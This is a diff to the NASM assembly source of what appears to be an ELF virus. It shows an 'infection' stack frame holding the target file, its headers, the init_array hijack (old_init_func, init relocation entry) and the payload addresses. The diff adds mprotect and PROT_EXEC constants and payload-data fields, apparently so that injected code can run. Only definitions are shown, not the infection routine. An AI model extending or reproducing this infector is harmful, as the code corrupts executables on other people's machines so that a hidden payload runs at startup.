@@ -7,6 +7,7 @@
 %define SYS_CLOSE       0x03
 %define SYS_LSEEK       0x08
 %define SYS_MMAP        0x09
+%define SYS_MPROTECT    0x0a
 %define SYS_MUNMAP      0x0b
 %define SYS_MREMAP      0x19
 %define SYS_MSYNC       0x1a
@@ -27,6 +28,7 @@
 
 %define PROT_READ       1
 %define PROT_WRITE      2
+%define PROT_EXEC       4
 
 %define MAP_PRIVATE     0x02
 %define MAP_SHARED      0x01
@@ -114,23 +116,25 @@ endstruc
 %define INFECTION_MAGIC 0xcafefeed
 
 struc       Infection_stack_frame ; Not really a structure but it will help to clarify the code
-    filename:               resq    1
-    fd:                     resd    1
-    pad_align:              resd    1
-    e_hdr:                  resb    ELFHDR_SIZE
-    file_size:              resq    1
-    map:                    resq    1
-    text_phdr_off:          resq    1
-    data_phdr_off:          resq    1
-    old_text_size:          resq    1
-    last_text_shdr_off:     resq    1
-    init_array_shdr_off:    resq    1
-    bss_shdr_off:           resq    1
-    old_init_func:          resq    1
-    payload_base_address:   resq    1
-    payload_base_offset:    resq    1
-    init_rela_entry_off:    resq    1
-    new_file_size:          resq    1
+    filename:                   resq    1
+    fd:                         resd    1
+    pad_align:                  resd    1
+    e_hdr:                      resb    ELFHDR_SIZE
+    file_size:                  resq    1
+    map:                        resq    1
+    text_phdr_off:              resq    1
+    data_phdr_off:              resq    1
+    old_text_size:              resq    1
+    last_text_shdr_off:         resq    1
+    init_array_shdr_off:        resq    1
+    bss_shdr_off:               resq    1
+    old_init_func:              resq    1
+    payload_base_address:       resq    1
+    payload_base_offset:        resq    1
+    init_rela_entry_off:        resq    1
+    new_file_size:              resq    1
+    payload_data_base_address:  resq    1
+    payload_data_base_offset:   resq    1
 endstruc
 
 %define STACK_FRAME_SIZE    0xc0
